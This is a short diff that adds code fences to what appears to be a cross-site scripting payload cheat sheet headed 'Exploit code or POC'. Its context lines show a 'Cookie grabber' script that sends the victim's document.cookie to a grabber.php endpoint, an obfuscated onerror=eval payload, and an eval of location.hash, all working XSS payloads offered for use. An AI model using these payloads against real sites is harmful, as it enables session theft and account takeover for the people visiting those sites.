@@ -1,6 +1,6 @@
 Exploit code or POC
 Cookie grabber for XSS
-
+```
 <?php
 // How to use it
 <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
@@ -685,3 +685,4 @@ onerror=eval;throw'=alert\x28document.domain\x29';
 // With location.hash = #alert(document.domain)
 
 eval(location.hash.substr(1))
+```
